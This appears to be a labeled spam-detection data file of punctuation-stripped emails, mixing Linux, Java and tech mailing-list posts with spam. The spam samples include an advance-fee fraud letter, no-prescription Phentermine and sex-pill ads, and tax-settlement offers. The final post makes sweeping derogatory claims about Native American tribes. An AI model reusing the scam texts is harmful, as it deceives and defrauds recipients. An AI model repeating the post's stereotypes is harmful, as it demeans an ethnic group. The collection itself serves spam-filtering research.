Re  Gabber packages for      was  All set for Red Hat Linux     Once upon a time  Julian wrote      I would appreciate it if you could get Gabber packages for Red Hat    I    will be making a new release soon  but even in the meantime           packages would be ok       I know that in the beta  red hat was using a modified version of    gnome libs which is incompatible with the latest gnomemm  If this is    still the case in    I can send you a patch which makes gnomemm work    again     I m facing another problem right now  It looks like libsigc   is no longer included in the distribution  and gtkmm won t compile without it     I guess I ll have to repackage it myself for      assuming it s possible    Matthias      Clean custom Red Hat Linux rpm packages   http   freshrpms net  Red Hat Linux release      Valhalla  running Linux kernel          acpi Load                   _______________________________________________ RPM List mailing list  http   lists freshrpms net mailman listinfo rpm list   ,1
hibody csmining org Discount                                                  Click here to view a   s a web page                                                               To banta   o csmining org       Privacy    Policy       Contact    Us  Copyright  A       All rights reserved                                                  ,0
[SPAM]  Answer or you suck        InfoMiner           td      text align  top          a  a link  a active      color                   a visited      color                   a hover      color   ff             main content h  a      text decoration  none           main content p      margin    px  px           main content img      border   px solid  cccccc           sidebar a      text decoration  none         sidebar div EntryContent div      margin    px  px           sidebar div EntryContent hr      border top   px solid  ffcc       border bottom   px solid             background color   ffcc       height   px     margin   px     padding        line height              EntryContent img      border    px solid  ffffff           Entry h  a      text decoration  none                      You are receiving this email because the email address hibody csmining org was subscribed to the InfoMine email list  InfoMiner   You may unsubscribe at any time                                             EventsMine                                                                             Copyright        InfoMine Inc  Suite           Hornby Street  Vancouver  British Columbia  Canada      V C  B   Please do not respond to this automated message            If you would no longer like to receive  InfoMiner  you may unsubscribe yourself at any time                 ,0
[Spambayes] Maybe change X Spam Disposition to something else    I actually like Neale s X Spam Disposition header  I just wonder if maybe we should choose something with a different prefix than  X Spam   so that people don t confuse it with SpamAssassin  all of whose headers begin with that prefix   Also  some sort of version information would be useful   Perhaps the CVS version number for the classifier module could be tacked on   Skip ,1
Re  spam mapsEugen Leitl wrote    P S  We hate you  too    Fuck you  sir   came the familiar tired chorus    Louder     FUCK YOU  SIR    Damn  I love that book  _Forever War_      Joe   http   xent com mailman listinfo fork   ,1
URGENT BUSINESS ASSISTANCE From nobody Wed Mar                  Content Type  text plain  charset iso        Content Transfer Encoding   bit   KEVIN GEORGE  ABIDJAN COTE D IVORIE WEST AFRICA  Dearest one   Although we have not met  I got your contact through the internet and  decided to contact you for assistance  I was  until recently  a final  year engineering student of the University of Sierra Leone West Africa   Early in January last year  the rebels in my country struck our township and killed my parents in one of their attacks  My late father  King Christopher George being the King of the Town was a prime target   Fortunately for me  I was in school when the attack took  place  I equally lost my only sister to the rebels  When I got home for the remains of my parents and the subsequent burial that followed  I discovered a document indicating that my late father had deposited some   M United States Dollars six million united states dollars  with one of the private security company here in abidjan cote d ivorie  This money  according to the docement  was meant for the building of an Auto repair company for me by my late father when I complete my studies  Upon the discovery of this document  I travelled to the cote d ivorie to trace the concerned security company and to make claims for the said money as the only surviving next of kin to my father   But deliberatley  I have decided to keep all my uncles and Aunts out of the issue as none of them will be happy to know I am in possession of such money  I have succeded in making the people at the security company believe that I am the next of Kin and all the documents related to are now with me  I do not know what to do with it but I have decided to contact you to seek your assistance in helping me to take it outfrom the security company and transfer it  to your account and help me to come to your country to continue my education and so that you will help me to get the money invested until such a time that I will be ready to begin to use it  I am really desperate as I am left alone now in the world Let me know what you want as compensation for helping me to solve this my problem  Most importantly Iseriously appeal that you maintain high level of secrecy and confidentiality in the whole thing  Please you can call me wilth is number                 I remain yours sincerely   KEVIN GEORGE                                                                                                                      Yahoo  Mail    Une adresse  yahoo fr gratuite et en fran ais   ,0
Re  Snow Leopard  Java   and NetbeansHas anyone tried it with the   M     or  M     developer preview  I m    somewhat concerned that this is a demonstrable regression between Java      and Java     however there are several other factors that can impact    memory use          vs     bit  biggest culprit         client    bit tuned garbage collection options running on        server    bit    client vs  server HotSpot itself  more aggressive compilation and    storage of compiled code     Anecdotally  I ve talked to several people who have large long running       bit processes on Snow Leopard with  GB of RAM machines who were    having a miserable time  While reverting to    bit may be a quick fix    for some  others who tuned the GC parameters or turned on     XX  UseCompressedOops  which compresses Java references to    bit    values in the heap  found that they could reclaim or even exceed their    original    bit performance  since they were still using the server    JVM      Since someone mentioned that NetBeans     Beta was working well  I d    suggest taking a look at it s JVM options and see if there wasn t some    tweaking done to optimize it for a    bit by default world     Best of luck   Mike Swingler  Java Runtime Engineer  Apple Inc     On Apr           at      AM  Dave Minnigerode wrote       I too have been using netbeans     on      and      with the default    jvm doing java   work    It s just stable enough for daily use   I do    restart NB every few hrs when the memory use gets out of hand     apparently some object leaks with the apple jvm nb combo      can t    switch it back to java    so kinda stuck with it  So I m probably just    going to switch to IntilliJ  I ve found it s performance to be a lot    better than NB overall    File tree nav is painless for example           I m kinda sad about it  but got work to get done             On Apr           at      AM  eisenstein csmining org wrote            Hmm  I m using the late      Macbook Pro       GHz upgraded to   GB    [    GB] RAM   I m using the latest Java through Software Update  and my    app is Swing based  using Matisse  and using the Swing Application    Framework with an embedded Derby database  though I will note that I    have issues even before any files are open  Just expanding the tree to    get to a file for opening tended to take about    seconds  and that s    assuming I didn t switch to another window in the meantime             I just did a full wipe reinstall of Netbeans to see if my settings    were a problem  but I had no change until I loaded in Java   and saw a    significant difference  I ll be trying out the suggestions people made    about using a different target platform than the one Netbeans is running    on  but I m starting to wonder if there is an issue with my system             On Apr              am  David Loeffler  wrote       I use NetBeans     Beta  I was using     but want the metadata    support for entity beans  and I have no problems   I have a late         MBP     and am using java version       _       I am developing a Java      running on GlassFish using Postgres as the database   This is a port of    he Java EE   app I architected in      and deployed in      on JBoss    using eclipse   JBoss Dev Studio as the IDE   It is a lot more than a    port since there a number of enhancements                               I have made no changes to the Java or preferences for NetBeans   Of    course the Java for my app is     and NetBeans runs on     as well                               I do see an increase in activity when there is an open dialog box so    I keep an eye out for them   I watch CPU activity since I had an issue    with Kernel panics a month ago   Turned out to be a combination of a    failing disk drive and a memory stick  Replaced the    G drive with    G    and the  G stick with  G  to make total of  G     Apple store guys could    not see the problems but through some handy tools and taking to external    service personnel we were able to zero in on the problem and fix it                               Side note  I have shutdown plugins in Safari mainly to keep Flash    from running   Some sites caused Flash plugin to push usage up to     or    more   I have been using iStat menu  I recommend  and also launch    activity monitor at login just to keep an eye on things                               On Apr           at      AM  Jon Eisenstein wrote                                I imagine this topic comes up every so often but I haven t been    able to find it in the archives     rom what I understand  there s some    issue with Snow Leopard and Java   that makes Netbeans     near    unusable   I ve had to do my development on a lesser powered PC because    there  things will actually open without pegging the CPU at      and    becoming unresponsive   Following a tip  I used Pacifist to reinstall    Leopard s Java   back onto the system  set it as the default  and tried    to launch Netbeans  Lo and behold  it was fast  responsive and showed    none of the problems I d been used to  Unfortunately  it made it so that    I couldn t work on my Java   based app                                 So  what is the actual situation here  Is this a known issue with    the Apple JVM that s  hopefully  going to get fixed  Is this a bug in    Netbeans  Am I the only one seeing issues this bad  and so it could be a    problem with my setup  Is there a workaround  Any help would be vastly    appreciated    the Windows box is having disk issues  and I d love to    move my primary development to the Macbook Pro as soon as possible  And    if push comes to shove  I may have to just rearchitect the project into    Java    which would not be a simple task                 _______________________________________________               Do not post admin requests to the list  They will be ignored                Java dev mailing list       Java dev lists apple com                Help Unsubscribe Update your Subscription                   http   lists apple com mailman options java dev ddl newsletters   mac com                                This email sent to ddl newsletters mac com                             _______________________________________________     Do not post admin requests to the list  They will be ignored      Java dev mailing list       Java dev lists apple com      Help Unsubscribe Update your Subscription         http   lists apple com mailman options java dev dave   minnigerode org            This email sent to dave minnigerode org    _______________________________________________    Do not post admin requests to the list  They will be ignored     Java dev mailing list       Java dev lists apple com     Help Unsubscribe Update your Subscription     http   lists apple com mailman options java dev swingler   apple com          This email sent to swingler apple com     _______________________________________________  Do not post admin requests to the list  They will be ignored   Java dev mailing list       Java dev lists apple com   Help Unsubscribe Update your Subscription   http   lists apple com mailman options java dev mlsubscriber tech   csmining org    This email sent to mlsubscriber tech csmining org    ,1
The only medically proven way to lose weight    DHF  Z FBelow is the result of your feedback form   It was submitted by   sje    aol com  on Thursday  May          at                                                                                            Looking to lose some weight before summer hits   Introducing Phentermine    the most popular weight loss drug in the world   Over     of doctors prescriptions for weight loss are for Phentermine    making it the most widely used prescription weight loss product in the nation    Phentermine   has been proven to keep cholesterol levels down  energy levels up  and most importantly help you lose pounds and inches in a relatively short period of time   Best of all  you don t need a prescription to order online  Takes only minutes to complete your order  and because you purchase online you pay NO doctors fees  All orders are shipped quickly and discreetly  and we now ship to all    states    click below for details  http   DDoHX www getphentermine com                                                                                                                       If you d like to be removed from this mailing list  please simply click here www deletemyrxmail com                                                                               ,0
[SPAM]  Dont let your intimate life turn into disaster Female intimacy tonic http   hh reixvyklick com       ,0
Eliminate Back Taxes Forever  ybf                                                                                                                     IRS TAX                PROBLEMS                                                                                                                                            It s Time to                                                                  Eliminate                                                            your IRS tax problems                                                           NOW                                                                                                                         Let Our Qualified People HELP You                                                                                       We Can Settle Your Back Taxes For PENNIES On The Dollar                                                                                                                                                                                         Respond                  now and one of our Debt Pros will get back to you within                     hours                                                                     CLICK HERE                                                                                                          If You wish to be removed from future mailings please  Clicking  Here                 ,0
Re  Which kernel for ThinkPad    XD       BEGIN PGP SIGNED MESSAGE       Hash  SHA     Ionreflex wrote      Stefan        [quote]        will work       may work     [ quote]            My impression exactly  but I d like to be sure   if I scrape this install     I ll have a hard time recovering it       There is nothing in the way to install  both  kernels  Just give the      a try and if it does not work you can just reboot into the     and  uninstall the      Make sure that the     is installed before you try  the      though           Johannes    In questions of science  the authority of a thousand is not worth the  humble reasoning of a single individual       Galileo Galilei  physicist and astronomer                   BEGIN PGP SIGNATURE       Version  GnuPG v       GNU Linux     iEYEARECAAYFAkvNRaMACgkQC NzPRl qEUw ACdFHBG PluIDZpuMGD fTPsEiQ   pQAn clzpn qmch FpkkKkXZoeDV JV   leB        END PGP SIGNATURE                To UNSUBSCRIBE  email to debian laptop REQUEST lists debian org  with a subject of  unsubscribe   Trouble  Contact listmaster lists debian org  Archive  http   lists debian org  BCD  A          physik blm tu muenchen de      ,1
quick hackURL  http   www aaronsw com weblog        Date            T                New York Times as a Weblog[ ]  source code[ ]  Comments appreciated  Yes  I  know UserLand had something like this[ ] but as you can see it doesn t seem to  be working anymore      [ ] http   nytimes blogspace com  [ ] http   nytimes blogspace com source py [ ] http   radio weblogs com            ,1
Re  New Sequences Window    Chris Garrigues said      Done   I also eliminated the msgs variable on the theory that simpler is        better  I spent a lot of time hacking out the underbrush in exmh while     working on the sequences window    Just a big  thank you  to Chris for being willing to dive in and get very messy   The sequence management code is some of the very oldest in exmh  and surely suffered as features were added over several years  When this stabilizes  it will be a great excuse for a     release      Brent Welch Software Architect  Panasas Inc Pioneering the World s Most Scalable and Agile Storage Network www panasas com welch panasas com     _______________________________________________ Exmh workers mailing list Exmh workers redhat com https   listman redhat com mailman listinfo exmh workers  ,1
Copy DVD Movies to CD R   COPY YOUR DVD MOVIES                                                                                                           CLICK HERE FOR                 FREE                 SOFTWARE                                                  COPY                DVD MOVIES TO CD R               RIGHT NOW                              NEW                   DVDCopyPlus                     All the software you need to COPY your own DVD Movies is included                  in DVDCopyPlus                    Copy                  your own DVD Movies using nothing more than our software  a DVD ROM                  and your CD R burner                                 Backup                    your DVD Movie Collection                 Playback                    on any home DVD player                  No                    Expensive DVD Burner Required                 Free                    Live Tech Support                                                                                                          DVD                Player must support VCD SVCD format  Most DVD players include this                feature                                            You received this email because you signed up at one of Consumer Media s websites or you signed up with a party that has contracted with Consumer Media  To unsubscribe from our email newsletter  please visit http   opt out consumerpackage net  e cdr lne com                 DeathToSpamDeathToSpamDeathToSpam                                                             This sf net email is sponsored by  Jabber   The world s fastest growing  real time communications platform  Don t just IM  Build it in   http   www jabber com osdn xim _______________________________________________ Spamassassin Sightings mailing list Spamassassin Sightings lists sourceforge net https   lists sourceforge net lists listinfo spamassassin sightings   ,0
[zzzzteana] RE PictishBarbara wrote  Pictish pictograms  still undeciphered                          I d be interested in an update on the latest thinking on these things  Particularly the  swimming elephant  pictogram   There s a book come out recently on the world s undeciphered scripts  including Linear A and Etruscan   Has any list member read it                            Yahoo  Groups Sponsor                             DVDs Free  s p Join Now http   us click yahoo com pt YBB NXiEAA MVfIAA  gSolB TM                                                                           To unsubscribe from this group  send an email to  forteana unsubscribe egroups com     Your use of Yahoo  Groups is subject to http   docs yahoo com info terms      ,1
[SPAM]  Post your ads where people read them           Weblog or blog population is exploding  around the world  resembling the growth of e mail users in the     s     Post your ads where people read them       What if you could place your ad on all these sites   Right  that would  mean you would have millions of sites linking to your ad   and my idea  actually works     I have developed a software that automatically places your ad on millions  of blogs     You will receive thousands of targeted hits to your website as Blog Blaster  places your ad on blogs that match your ad s category  This method has never  been released to the public before  Very few  if anyone has implemented  this     Click  here to visit my website                        Unsubscribe                  ,0
Note to self  Read the pingback spec  Form opinion URL  http   scriptingnews userland com backissues            When        PM Date  Wed     Sep               GMT  Note to self  Read the pingback spec[ ]  Form opinion   [ ] http   www hixie ch specs pingback pingback   ,1
Re  [ILUG] dial on demandOn Wed  Aug          at         PM        al mpsc ph wrote    Could you please help me how to set up a dial on demand  what are the   packages needed    and other requirements to get on  depends on what you are using to dial  for debian put  demand  in  etc ppp peers   use  idle      to set the timeout to    minutes     secs   im not sure where exactly to put it for other distros  whereever pppd gets it options from   regards     Ivan Kelly  ivan ivankelly net       BEGIN GEEK CODE BLOCK      Version       GCS d  s   a    C   UL     P    L    E    W   N  o   K  w     O   M   V   PS    PE  Y  PGP   t    X   R tv  b  DI  D    G e h  r   y         END GEEK CODE BLOCK            Irish Linux Users  Group  ilug linux ie http   www linux ie mailman listinfo ilug for  un subscription information  List maintainer  listmaster linux ie  ,1
Re  Connecting to vpn serverOn    Apr       Jordan Metzmeier wrote     On                  PM  Anthony Campbell wrote      I have to find out how to connect to a vpn server  I know nothing about     this and have little time to find out  because I need to get it working     by Saturday           Can anyone kindly tell me what package s  to install and point me to a      preferably simple  how to           Anthony         There are many different type of VPNs    Is the server already    running  Do you know what it is using  openvpn or PPTP for example          If it is your job to setup both the client  and server  openvpn    could be a good place to start  Their documentation is quite good     If you need to connect to an existing VPN server  you need to know    the type of VPN before you can choose client software         Thanks for the prompt reply  I just need to be able to connect to the  server at pc streaming  to get TV when abroad  It is pptp  Would  pptp linux and network manager pptp be the way to go     Anthony         Anthony Campbell   ac acampbell org uk   Microsoft free zone   Using Debian GNU Linux   http   www acampbell org uk   sample my ebooks at  http   www smashwords com profile view acampbell           To UNSUBSCRIBE  email to debian user REQUEST lists debian org   with a subject of  unsubscribe   Trouble  Contact listmaster lists debian org  Archive  http   lists debian org                GA      acampbell org uk      ,1
Re  Where to find setup for env variable On                   Paul Chany wrote       Maybe must I use grep to find the file containing  JAVA_HOME      If yes  I dont  know the exact expression of that grep command     grep  sIr  JAVA_HOME   etc            To UNSUBSCRIBE  email to debian user REQUEST lists debian org   with a subject of  unsubscribe   Trouble  Contact listmaster lists debian org  Archive  http   lists debian org  BC A        chello at      ,1
Re  iceweasel crashing when closing tabsOn Wed     May                      briand wrote       I think it s related to javascript  but then again I think all browser    problems are related to javascript  I mean when they re not related to    flash     Uh  No  there are many problems coming for different sources that can   affect the browser stability     Javascript  and flash as well as other plugins  can be one of them  sure    but disabling it should cure the issue at all  If it does not  that means   the problem can lie somewhere  packaging error  xul library or even old   profile settings      But  closing tags and getting crash randomly  is not the type of   behaviour I would associate to a javascript issue becasue javascript code   should have been rendered when the page loads or when clicking on items    but not at page tab close        Greetings          Camale  n           To UNSUBSCRIBE  email to debian user REQUEST lists debian org   with a subject of  unsubscribe   Trouble  Contact listmaster lists debian org  Archive  http   lists debian org pan                     csmining org      ,1
Re[ ]  Forged whitelist spamOn Sun     Aug      bitbitch magnesium net wrote     You mean like on mac keyboards        Or laptops  which are as damn  Yeah  I was thinking of the G  keyboard when I wrote this  Otherwise lousy feel and key placement  though   That s why I m holding on to my IBM Model M Space Saver  Once I get an PS  to USB converter  I expect it will outlive several generations of computer hardware    Very good for sticking in USB fobs into  though  CRTs LCD panels are even  better for that  though     near close to keyboard usb connection as one can get  without the real   thing   I think laptops are largely useless because of the battery and the  keyboard issue   http   xent com mailman listinfo fork   ,1
[IIU] spyware calling home Hello all I m looking for advice  My pc has developed a disturbing tendency of trying to access IP               without my consent  It has got to the stage where normal web browsing is almost impossible  I have checked IP address on RIPE database and I know precisely who is being called  I contacted that company on    July  when the problem first arose and asked for a remedy but  surprise  got no reply  A helpful person on the ie comp list suggested Adaware spyware removal  I ran this and haven t had a problem again until today  The offending program is obviously not in Adaware db   I run adaware with current ref files every day now   Any suggestions  please   for removing whatever the f    is causing this from my pc  Brian   _______________________________________________ IIU mailing list IIU iiu taint org http   iiu taint org mailman listinfo iiu   ,1
Find Senior Housing Options Fast with APlaceforMom          Free Help Finding Senior Care for Mom or Dad                                  ,0
Re  SnowSeptember Haiku  Freezing my ass off Air conditioning on high heats small apartment    Cindy  in Mississippie P S  this one s for you  geege     On Tue     Sep       Paul Chvostek wrote        I can tell I m not the only one without air conditioning            Maybe I ll move to Canmore         p         On Tue  Sep          at         PM        Swerve wrote           moo hahahaha           i need a smoke           stop this heatwave           bring on winter           bring on fall                Swerve  shut up           bye              I don t take no stocks in mathematics  anyway    Huckleberry Finn   ,1
Re  The GOv gets tough on Net Users     er Pirates   What are you trying to sell     What is the Value     Example   Does Pratchett sell paper bound by glue or does he sell stories     Question   When I buy a book have I purchased the story  When I sell the book does any of that revenue go to mr Pratchett   What if I read the book and  give it to someone  who then reads it and gives it  to someone who then reads it and gives it to someones     bookcrossing com though with  more succesfull passings   Does each reader send Mr Pratchett money   Have Used Bookstores  Recorstores etc destroyed the system of book record economy   AS to the resident sourpuss  in germany bitter may be better but here its just plain stinkin thinkin     tom     ,1
[SPAM]  No idea too             Health Monitor Newsletter       body       background color   ffffff      font family  Arial      font size    px      font weight  normal      color    c c c      margin         padding         a  a active  a visited       color       be      text decoration  none      td header p       font family  Arial      font size    px      font weight  normal      color   ffffff      margin         padding         text align  left      td header p a       font family  Arial      font size    px      font weight  normal      color   ffffff      text decoration  none      td spacer_header       padding   px    px        td subheader       background color               padding   px   px  px   px      td links       text align  right      font size    px    padding top   px      td subheader p title       font family  Arial      font size    px      font weight  bold      color   ffffff      text align  left      td subheader p links       text align  right      td subheader p a       font family  Arial      font size    px      font weight  normal      color   a a a       text decoration  none      td body       padding    px   px   px   px      td subbody       padding        px        td body p title       font family  Georgia      font size    px      font weight  normal      color               padding        px        margin         text align  left      td body p title a       color               text decoration  none      font family  Georgia      font size    px      font weight  normal      padding        px        margin         text align  left      td body p title a hover       text decoration  underline      td body p subtitle       font family  Arial      font size    px      font weight  bold      color       be      margin         padding       px        text align  left      td body p subtitle a       font family  Arial      font size    px      font weight  bold      color       be      text decoration  none      td body p desc       font family  Arial      font size    px      font weight  normal      color    c c c      line height    px      padding         margin         text align  left      td body p a       font family  Arial      font size    px      font weight  bold      color       be      td spacer       padding    px     px        td updates       padding    px   px   px   px      background color   ececec      p updates       font family  Arial      font size    px      font weight  bold      color    e e e      text align  left      margin   px     px        padding         td lblock       padding      px          td rblock p left       text align  left      td lblock p subupdate       text align  left      font family  Georgia      font size    px      font weight  normal      color       be      text align  left      td rblock p subupdate       text align  left      font family  Georgia      font size    px      font weight  normal      color       be      td lblock p subupdate a       text align  left      font family  Georgia      font size    px      font weight  normal      color       be      text decoration  none      td rblock p subupdate a       text align  left      font family  Georgia      font size    px      font weight  normal      color       be      text decoration  none      td lblock p desc       text align  left      font family  Arial      font size    px      font weight  normal      color    c c c      line height    px      td rblock p desc       text align  left      font family  Arial      font size    px      font weight  normal      color    c c c      line height    px      p specialtitle       text align  left      font family  Georgia      font size    px      font weight  normal      color       be      text align  left      margin        px        padding top   px      p specialdesc       text align  left      font family  Arial      font size    px      font weight  normal      color    c c c      line height    px      margin       px        td address       padding   px     px        line height    px      td social       padding        px        line height    px      td body p address       font family  Arial      font size    px      font weight  normal      color   b b b       text align  left      td unsub       padding    px   px   px   px      td unsub p       font family  Arial      font size    px      font weight  normal      color    c c c      line height    px      padding         margin         text align  left      td unsub p unsub       padding        px        td unsub p a       font family  Arial      font size    px      font weight  normal      color    f f d      text decoration  none      td social p a       font family  Arial      font size    px      font weight  normal      color    ab ff      text decoration  none      td unsub p socialtitle  td social p socialtitle     font size    px    text transform  uppercase    padding       px      margin       text align  left      td mini_spacer       padding        px        td specialupdate     border   px solid  f e a     background color   fff d     padding   px      td specialupdate h      font family  Arial    font size    px    font weight  bold    color        e    text decoration  none    margin        px      padding         td specialupdate p     font family  Arial    font size    px    font weight  normal    color             text decoration  none    line height    px                                                                                                                                            THIS ISSUE                                                                                                                                                  Reveal your full male power                                                                                                                                     Unlimited sensual power                                                                                                                                       Solution to excel other men                                                                                                                                     Small pilule  strong desire                                                                                                                                       Load her with more come                                                                                                                                                                                                                                                                                           Health Monitor September Newsletter                          Forward     Unsubscribe     View in browser                                                                                                                                                                                                    Finally  when you think you re totally out of lovemaking        sport                                                                                 Our pilules will prepare your glorious come back  You ll        do it like a young stud  causing girls   peaks  and hot        moans  Order now and        enjoy super satisfaction                                                                                                                                                                                                      Know how everybody calls it                 The weekend pilule                                         Why  Because just one little thing is enough for           doing your girl the whole weekend  Needless to have           breaks  Our product makes you a non stop love           champion  Amaze her            Please her  Hump her                                                                                                                              Thanks for reading  see you again next month                   The Health Monitor team                                                                                                                                                                                                                          WHO ARE YOU  WHAT IS THIS                                  You re receiving this newsletter because you re a super cool           Health Monitor customer  or subscribed via our site  Just not that into us any more  Unsubscribe instantly                                Know how we can serve you better  We d love to hear your feedback on what we can improve                                                                                                                                             WANT TO HANG OUT                                  Follow us on Twitter                                   Become  fan on Facebook                                                                                                                                                                                                                                                               Health Monitor eats catered lunches at         Stapleton Ave  Sydney  Australia                                                                                                                                                                                                              ,0
Native American economics  was Re  sed  s United States Roman     Empire g  I wanted to get back to this but didn t have the time   I actually lived on a couple different Indian reservations growing up in the Pacific Northwest and also spent a fair amount time in Lakota Sioux country as well   And my parents have lived on an even more diverse range of Indian reservations than I have  my experience being a direct result of living with my parents    I do get a lot of my information first hand  or in some cases  second hand from my father   The income figures for the Indians are somewhat misleading  mostly because it is really hard to do proper accounting of the effective income   While it is true that some Indians live in genuine poverty  it is typically as a consequence of previous poor decisions that were made by the tribe  not something that was impressed upon them   The primary problem with the accounting is that there is a tribal entity that exists separately from the individuals  typically an  Indian Corporation  of one type or another where each member of the tribe owns a single share  the details of when and how a share becomes active varies from tribe to tribe    In most tribes  a dividend is paid out to each of the tribal members from the corporation  usually to the tune of       k per person  depending on the tribe   The dividend money comes from a number of places  with the primary sources being the Federal Gov t and various businesses assets owned by the Indian corporation   You have to understand a couple things   First  a great many Indian tribes are run as purely communist enterprises   Everyone gets a check for their share no matter what   One of the biggest problems this has caused is very high unemployment  often         for tribal members  who are more than happy take their dividend and not work   The dividend they receive from the corporation often constitutes their sole  income  for government accounting purposes   Unfortunately  to support this type of economics when no one works  they ve had to sell off most of their useful assets to maintain those dividends   Many of the tribes genuinely living in poverty do so because they have run out of things to sell yet nobody works   One of the ironies is that on many of the reservations where the tribes still have assets to burn  many of the people working in the stores and such are actually poor white folk  not Indians   Second  even though the tribe members each get a cash dividend  they also receive an enormous range of benefits and perks from the Indian corporation to the tune of tens of thousands of dollars per person annually   By benefits and perks  we are talking about the kinds of things no other ordinary American receives from either their employer or the government   It should be pointed out that while many of these Indian corporations are ineptly run  and mostly provide sinecures for other Indians  a minority are very smartly managed and a few hire non Indian business executives with good credentials to run their business divisions   An example of this is the Haida Corporation  which while having less       tribal shareholders  has billions of dollars in assets and the various corporations they own have gross revenues in the          million range  and growing    Yet the dividend paid out is strictly controlled  about    k in this particular case  and they engaged in a practice of waiting a couple decades before drawing money from any of the assets they were granted which has led to intelligent investment and use   They don t eat their seed corn  and have actually managed to grow their stash   In contrast  a couple islands over  there is another tribe of        people that has a net loss of about     million annually IIRC while being regularly endowed by the Federal government with several billions of dollars in valuable assets   This particular tribe has a modest income in theory  but the actual expenditures per person annually is in the hundreds of thousands of dollars  and many borrow money against future income   Incidentally  in this particular case  the people that ARE working frequently pull in a few hundred thousand dollars a year  much of which goes back to the tribal corporation rather than their own pockets   Somewhat annoying  the Federal government semi regularly grants valuable assets to these tribes when they ve burned through the ones previously given where feasible  typically selling the assets to American or foreign companies   And the cycle continues   So what is the primary problem for the tribes that have problems   In a nutshell  a thoroughly pathological culture and society   Few women reach the age of    without getting pregnant   Incest  rape  and gross promiscuity is rampant   Inbreeding  heavy drug abuse during pregnancy  and other environmental factors have created tribes where a very substantial fraction of the tribe is literally mentally retarded   Many of the thoughtful and intelligent tribe members leave the reservation at the earliest opportunity  mostly to avoid the problems mentioned above   On one reservation my parents lived  the HIV infection rate was        Many of these societies are thoroughly corrupt  and the administration of the law is arbitrary and capricious  they do have their own judges  courts  police etc    In short  many of these tribes that are still hanging together are in a shambles because they have become THE most pathological societies that I have ever seen anywhere   Because of their legal status  there really aren t that many consequences for their behavior   There are many things that I could tell you that I ve seen that you probably would not believe unless you d seen it yourself   There are always good people in these tribes  but it has gotten to the point where the losers and idiots outnumber the good guys by a fair margin many times  and this IS a mobocracy typically    BTW  if any of you white folk wants to experience overt and aggressive racism as a minority in a place where the rule of law is fiction and the police are openly thugs  try living on one of these messed up Indian reservations   It will give you an interesting perspective on things    There are only two real situations where you find reasonably prosperous Indians   The first is in the rare case of tribes run by disciplined and intelligent people that have managed their assets wisely   The second is where the tribe has dispersed and assimilated for the most part  even if they maintain their tribal identity   In both of these cases  the tribal leaders reject the insular behavior that tends to lead to the pathological cases mentioned above   The Indians are often quite wealthy technically  and a lot of money is spent by the tribe per capita   And the actual reportable income is quite high when you consider how many are living entirely off the tribal dole   It is just that their peculiar economic structure does not lend itself well to ordinary economic analysis by merely looking at their nominal income   The poverty is social and cultural in nature  not economic   This was my original point    On a tangent   One thing that has always interested me is the concept of quasi tribal corporate socialism   Many Indian tribes implement a type of corporate socialism that is mind bogglingly bad in execution   That they use this structure at all is an accident of history more than anything   But what has interested me is that the very smartly managed ones do surprisingly well over the long run   It is like a Family Corporation writ large   It seems that in a future where  familial  ties will be increasingly voluntary  the general concept may have some merit in general Western society  serving to create a facsimile of a biological extended family with the included dynamics  but with an arbitrary set of self selecting individuals   Damn that was long  and its late   and it could have been a lot longer    James Rogers  jamesr best com     On              PM   John Hall   wrote       As I understand it  there is a huge difference between native Americans   who speak english at home and those who do not   I don t have figures   that separate those at hand  though            American Indians  US Pop as a whole     Families below poverty                Persons below poverty              Speak a language other   than English           Married couple families             Median family   income                   Per Capita                     ,1
